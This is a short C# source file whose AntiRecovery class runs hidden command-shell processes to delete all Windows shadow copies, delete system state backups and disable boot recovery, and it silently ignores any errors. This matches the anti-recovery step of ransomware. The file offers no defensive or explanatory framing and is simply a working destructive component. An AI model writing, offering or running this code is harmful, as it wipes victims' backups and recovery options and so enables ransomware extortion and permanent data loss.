using System.Diagnostics;

public static class AntiRecovery
{
    public static void Wipe()
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c vssadmin delete shadows /all /quiet",
                CreateNoWindow = true,
                UseShellExecute = false
            });

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c wbadmin delete systemstatebackup -keepversions:0",
                CreateNoWindow = true,
                UseShellExecute = false
            });

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c bcdedit /set {default} recoveryenabled No",
                CreateNoWindow = true,
                UseShellExecute = false
            });
        }
        catch { }
    }
}
